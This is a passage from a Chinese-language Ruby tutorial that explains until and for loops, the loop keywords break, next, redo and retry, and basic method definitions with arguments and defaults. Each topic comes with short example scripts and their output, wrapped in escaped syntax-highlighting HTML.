&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;</code></pre></div><div><strong>untile:</strong></div></div></div><div>语法1:</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;until conditional &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div><div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;$i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;$num &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;until $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $num&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Inside the loop i = #$i&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code></pre></div><div>语法2：</div></div></div></div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;code until conditional&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;OR&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;end until conditional&lt;/span&gt;</code></pre></div><div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;$i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;$num &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Inside the loop i = #$i&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;end until $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $num&lt;/span&gt;</code></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code></pre></div><div><strong>for语句</strong>：</div></div></div></div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; variable &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; variable &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;...]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; in expression &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div><div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i in &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Value of local variable is #{i}&quot;&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div></div><div>这里我们定义的范围 0 .. 5 。因为在语句 for i in 0..5 将允许取值的范围从0到5（含5），这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code></pre></div></div><div> for…in 循环几乎是完全等同于：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;each &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;variable&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; variable&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;...]|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; code end&lt;/span&gt;</code></pre></div></div><div>除了一个for循环不创建一个新的局部变量的范围。一个循环的表情从代码分离，保留字，一个换行符，或分号。</div><div>例子:</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;each &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Value of local variable is #{i}&quot;&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code></pre></div><div>关键字：</div></div></div></div><div>break：跳出循环</div><div>next：进去下一次循环</div><div>redo：重新循环此次迭代（不检查此次循环条件）</div><div><br></div><div><strong>retry语句</strong>：</div><div><div>如果 retry 表达出现在 rescue 子句，则从开始重新开始。</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; do_something &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# exception raised&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;rescue&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# handles error&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; retry&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# restart from beginning&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div></div><div>如果出现重试迭代，块，或体内的表达，重新启动迭代调用。迭代器的参数条件将重新计算。</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i in &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; retry &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; some_condition &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# restart from i == 1&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div><div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i in &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; retry &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Value of local variable is #{i}&quot;&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div></div><div>这将产生以下结果，将进入无限循环：&nbsp;</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pun&quot;&gt;............................&lt;/span&gt;</code></pre></div><h3 id="8-函数"><a href="#8-函数" class="headerlink" title="8.函数"></a>8.函数</h3><p></p></div></div></div></div><div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><ol><li><code>&lt;span class=&quot;pln&quot;&gt;def method_name &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;arg &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]]...[,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; arg &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;expr &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]])]&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; expr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></p></li></ol></pre></div></div><div>所以，可以定义一个简单的方法如下：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;pln&quot;&gt;def method_name &lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; expr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></p></li></pre></div></div><div>可以表示方法，接受这样的参数：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;pln&quot;&gt;def method_name &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;var1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; var2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; expr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></p></li></pre></div></div><div>可以设置默认值，如果不传递所需的参数调用方法的参数将用于：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;pln&quot;&gt;def method_name &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;var1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;value1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; var2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;value2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; expr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;</code></li><li><p><code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></p></li></pre></div></div><div>无论何时调用方法很简单，只需写方法的名称如下：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;pln&quot;&gt;method_name&lt;/span&gt;</code></p></li></pre></div></div><div>然而，当调用一个方法带有参数，编写方法的名称以及参数，如：</div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;pln&quot;&gt;method_name &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30&lt;/span&gt;</code></p></li></pre></div></div><div>使用带参数的方法的最重要缺陷是，每当调用这些方法需要记住的参数个数。</div><div>例如，如果一个方法接受三个参数传递只有两个，那么Ruby的将显示一条错误。</div></div><div><div><div><pre class="prettyprint linenums prettyprinted"><p></p><li><p><code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code></p></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;def test&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Ruby&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; a2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Perl&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;The programming language is #{a1}&quot;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;The programming language is #{a2}&quot;&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></li><li><code>&lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span 